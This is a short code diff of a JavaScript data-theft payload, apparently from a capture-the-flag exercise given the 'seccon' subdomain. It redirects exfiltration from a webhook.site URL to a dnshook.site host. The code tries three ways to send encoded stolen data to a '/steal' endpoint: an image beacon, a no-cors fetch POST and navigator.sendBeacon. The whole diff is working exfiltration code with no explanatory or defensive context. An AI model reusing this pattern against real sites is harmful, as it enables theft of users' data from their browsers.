@@ -54,12 +54,12 @@
             // Try image beacon
             try {
                 const img = new Image();
-                img.src = 'https://webhook.site/cf1f2dfe-253c-4682-9476-51752a41e89f/steal?data=' + encoded;
+                img.src = 'https://hack.the.planet.seccon.cf1f2dfe-253c-4682-9476-51752a41e89f.dnshook.site/steal?data=' + encoded;
             } catch(e) {}
             
             // Try fetch
             try {
-                fetch('https://webhook.site/cf1f2dfe-253c-4682-9476-51752a41e89f/steal', {
+                fetch('https://hack.the.planet.seccon.cf1f2dfe-253c-4682-9476-51752a41e89f.dnshook.site/steal', {
                     method: 'POST',
                     body: JSON.stringify(exfilData),
                     mode: 'no-cors'
@@ -68,7 +68,7 @@
             
             // Try sendBeacon
             try {
-                navigator.sendBeacon('https://webhook.site/cf1f2dfe-253c-4682-9476-51752a41e89f/steal', JSON.stringify(exfilData));
+                navigator.sendBeacon('https://hack.the.planet.seccon.cf1f2dfe-253c-4682-9476-51752a41e89f.dnshook.site/steal', JSON.stringify(exfilData));
             } catch(e) {}
         }
         
